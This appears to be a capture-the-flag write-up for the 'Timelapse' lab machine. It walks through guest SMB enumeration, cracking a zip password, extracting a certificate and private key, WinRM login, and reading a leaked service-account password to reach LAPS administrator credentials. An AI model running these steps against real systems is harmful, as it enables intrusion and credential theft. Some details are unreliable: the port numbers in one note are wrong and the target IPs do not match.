# Enumeration

## NMAP Scan

```
# Nmap 7.99 scan initiated Fri Jul  3 03:41:04 2026 as: /usr/lib/nmap/nmap -sC -sV --reason -oA timelapse 10.129.10.233
Nmap scan report for 10.129.10.233
Host is up, received echo-reply ttl 127 (0.11s latency).
Not shown: 988 filtered tcp ports (no-response)
PORT     STATE SERVICE           REASON          VERSION
53/tcp   open  domain            syn-ack ttl 127 Simple DNS Plus
88/tcp   open  kerberos-sec      syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2026-07-03 15:41:20Z)
135/tcp  open  msrpc             syn-ack ttl 127 Microsoft Windows RPC
139/tcp  open  netbios-ssn       syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp  open  ldap              syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: timelapse.htb, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?     syn-ack ttl 127
464/tcp  open  kpasswd5?         syn-ack ttl 127
593/tcp  open  ncacn_http        syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ldapssl?          syn-ack ttl 127
3268/tcp open  ldap              syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: timelapse.htb, Site: Default-First-Site-Name)
3269/tcp open  globalcatLDAPssl? syn-ack ttl 127
5986/tcp open  ssl/wsmans?       syn-ack ttl 127
|_ssl-date: 2026-07-03T15:43:06+00:00; +7h59m59s from scanner time.
| ssl-cert: Subject: commonName=dc01.timelapse.htb
| Not valid before: 2021-10-25T14:05:29
|_Not valid after:  2022-10-25T14:25:29
| tls-alpn: 
|   h2
|_  http/1.1
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-07-03T15:42:27
|_  start_date: N/A
|_clock-skew: mean: 7h59m58s, deviation: 0s, median: 7h59m57s
| smb2-security-mode: 
```

Instead of 5985, port 5986 is open, which is for WinRM with SSL enabled

## SMB Share Enumeration with NXC

We do not have any credentials provided to us, which means we should try Guest Enumeration

```
┌──(kali㉿kali)-[~/htb/timelapse]
└─$ nxc smb timelapse.htb -u '.' -p '' --shares
SMB         10.129.227.113  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:timelapse.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.227.113  445    DC01             [+] timelapse.htb\.: (Guest)
SMB         10.129.227.113  445    DC01             [*] Enumerated shares
SMB         10.129.227.113  445    DC01             Share           Permissions     Remark
SMB         10.129.227.113  445    DC01             -----           -----------     ------
SMB         10.129.227.113  445    DC01             ADMIN$                          Remote Admin
SMB         10.129.227.113  445    DC01             C$                              Default share
SMB         10.129.227.113  445    DC01             IPC$            READ            Remote IPC
SMB         10.129.227.113  445    DC01             NETLOGON                        Logon server share 
SMB         10.129.227.113  445    DC01             Shares          READ            
SMB         10.129.227.113  445    DC01             SYSVOL                          Logon server share
```

The share named `Shares` is readable

## Reading the Share with SMBClient

```
smbclient //timelapse.htb/Shares -U Guest
```

There are two directories in this share, `Dev` and `HelpDesk`
The timestamp on `dev` is different than HelpDesk, it had a file named `winrm_backup.zip`, which is password protected

# Foothold

## Cracking ZIP file password

```
zip2john winrm_backup.zip >> winrm_backup.hash
john --wordlist=/usr/share/wordlists/rockyou.txt winrm_backup.hash
```

The password was `supremelegacy`

The zip file had a pfx file named `legacyy_dev_auth.pfx`

```
NOTE: I tried using certipy to get the hash from legacyy_dev_auth.pfx since certipy usually works with pfx files
It did not work in this case cause Certipy is trying to make PKINIT requests to the domain controller using the certificate. But this is a self-signed certificate. So the KDC, etc doesn't know how to validate the certificate because there's no chain of trust
```

## Using OpenSSL to extract certificate and private key from PFX file

### Extracting Public Certificate

```
openssl pkcs12 -in legacyy_dev_auth.pfx -clcerts -nokeys -out certificate.crt 
```

### Extracting Private Key

```
openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out private.key -nodes
```

This gives us the Private Key and the Public Cert

## Using Evil-WinRM with key and certificate

```
NOTE: This machine is using port 5896, and not the default 5895 port for WinRM.
Port 5896 is WinRM encrypted
```

```
evil-winrm -S -i timelapse.htb -c certificate.crt -k private.key
```

`-S enabled SSL mode`
`-c uses the public key/certificate`
`-k uses private key`

The user flag was then found in `C:\Users\legacyy\Desktop`

# Privilege Escalation

SharpHound.exe was not running on the machine cause of Windows Defender
So I just ran `WinPEASany.exe` to see if I get anything interesting

I found `C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt`

```
*Evil-WinRM* PS C:\Users\legacyy\Documents> type C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
whoami
ipconfig /all
netstat -ano |select-string LIST
$so = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck
$p = ConvertTo-SecureString 'E3R$Q62^12p7PLlC%KWaxuaV' -AsPlainText -Force
$c = New-Object System.Management.Automation.PSCredential ('svc_deploy', $p)
invoke-command -computername localhost -credential $c -port 5986 -usessl -
SessionOption $so -scriptblock {whoami}
get-aduser -filter * -properties *
exit
```

This reveals the password of `svc_deploy` user, which is `E3R$Q62^12p7PLlC%KWaxuaV`

If we run `net user svc_deploy`, we see that svc_deploy is part of `LAPS_readers` group

`LAPS` stands for `Local Administrator Password Solution`. It is a security feature built into Windows that automatically manages and randomizes the local administrator account password on every computer in your network.

The last set password of administrator is readable by every user in LAPS Reader group

Using this password, we can use Evil-WinRM to login as `Administrator`, and the root flag is in `C:\Users\TRX\Desktop`

